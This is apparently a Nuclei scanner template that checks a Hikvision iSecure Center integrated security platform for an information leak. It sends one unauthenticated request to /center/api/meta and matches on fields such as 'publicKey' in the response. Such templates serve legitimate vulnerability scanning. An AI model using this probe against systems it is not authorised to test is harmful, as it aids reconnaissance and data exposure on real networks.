id: hikvision-isecure-meta-infoleak
info:
  name: 海康威视综合安防管理平台 信息泄露
  author: SleepingBag945
  severity: low

variables:
  filename: "{{to_lower(rand_base(10))}}"

http:
  - raw:
      - |
        GET /center/api/meta HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        dsl:
          - 'status_code==200 && contains_all(body_1,"standardTime","userManual","publicKey")'
